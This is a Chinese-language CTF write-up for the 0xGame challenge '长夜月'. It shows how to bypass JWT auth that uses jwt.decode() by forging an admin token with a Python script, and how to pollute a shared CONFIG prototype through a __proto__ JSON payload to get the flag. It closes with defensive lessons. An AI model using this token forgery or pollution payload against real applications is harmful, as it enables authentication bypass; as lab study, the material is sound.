# 长夜月

## 题目简述

题目是一个 Express 应用。普通用户注册后会得到 JWT，管理员页面 `/admin_club1st` 接收一组“长夜月”数据，并要求把最早公开时间回溯到 `2025-08-03` 之前。

完整漏洞链包含两步：鉴权代码使用 `jwt.decode()` 而不是 `jwt.verify()`，因此修改 JWT 载荷后无需有效签名即可伪装成管理员；管理员接口中的递归合并函数又能通过 `__proto__` 修改共享的 `CONFIG` 原型对象，使新对象继承攻击者设置的 `min_public_time`，从而进入返回 flag 的分支。

## 解题过程

### 绕过 JWT 鉴权

注册任意账户后，服务端签发包含用户名和密码的 JWT：

```javascript
function generateJWT(username, password) {
    return jwt.sign({ username, password }, JWT_SECRET, { expiresIn: '10h' });
}
```

但管理员中间件只解码令牌，没有验证签名：

```javascript
const data = jwt.decode(token);
if (data.username === 'admin') {
    return next();
}
```

因此保留原令牌的头部和签名，直接把载荷中的 `username` 改为 `admin` 即可。下面的脚本接收注册所得令牌并输出篡改后的令牌：

```python
import base64
import json
import sys

header, payload, signature = sys.argv[1].split(".")
padding = "=" * (-len(payload) % 4)
data = json.loads(base64.urlsafe_b64decode(payload + padding))
data["username"] = "admin"

new_payload = base64.urlsafe_b64encode(
    json.dumps(data, separators=(",", ":")).encode()
).rstrip(b"=").decode()

print(f"{header}.{new_payload}.{signature}")
```

虽然修改后签名已经失效，但 `jwt.decode()` 不执行密码学校验。把输出令牌放入 `token` Cookie，或作为 `Authorization: Bearer <token>` 发送，即可访问管理员接口。

### 污染 CONFIG 原型对象

管理员接口创建一个以 `CONFIG` 为原型的对象，再把请求体递归合并进去：

```javascript
function merge(dst, src) {
    if (typeof dst !== "object" || typeof src !== "object") return dst;
    for (let key in src) {
        if (key in src && key in dst) {
            merge(dst[key], src[key]);
        } else {
            dst[key] = src[key];
        }
    }
}

let evernight = Object.create(CONFIG);
merge(evernight, req.body);
let en = Object.create(CONFIG);

if (en.min_public_time < "2025-08-03") {
    return res.render('march7th', { message: FLAG });
}
```

对于由 `JSON.parse()` 产生的请求体，`__proto__` 是一个可枚举的自有属性。目标对象 `evernight` 又继承自 `CONFIG`，所以读取 `evernight.__proto__` 得到的正是 `CONFIG`。`merge()` 遇到该键后递归执行的等价效果为：

```javascript
CONFIG.min_public_time = "2024-08-03";
```

随后创建的 `en` 以已被修改的 `CONFIG` 为原型，因而能够继承这个日期。发送以下 JSON 即可完成污染：

```http
POST /admin_club1st HTTP/1.1
Host: target
Authorization: Bearer <tampered-jwt>
Content-Type: application/json

{
  "__proto__": {
    "min_public_time": "2024-08-03"
  }
}
```

日期采用固定宽度的 `YYYY-MM-DD` 格式，字符串字典序与时间先后顺序一致，因此 `"2024-08-03" < "2025-08-03"` 为真。服务端渲染 `march7th.ejs`，并将环境变量中的 flag 作为 `message` 输出：

```text
0xGame{Back_to_Earth_in_Evernight}
```

## 方法总结

本题把未验签 JWT 与原型链污染串联起来。前者说明“能解码”不等于“已认证”，安全鉴权必须调用 `jwt.verify()` 并限制算法；后者说明递归合并不可信 JSON 时，应拒绝 `__proto__`、`prototype`、`constructor` 等特殊键。这里被污染的是共享的 `CONFIG` 原型对象，而不是全局 `Object.prototype`，准确追踪对象的原型关系才能看清 flag 条件为何成立。
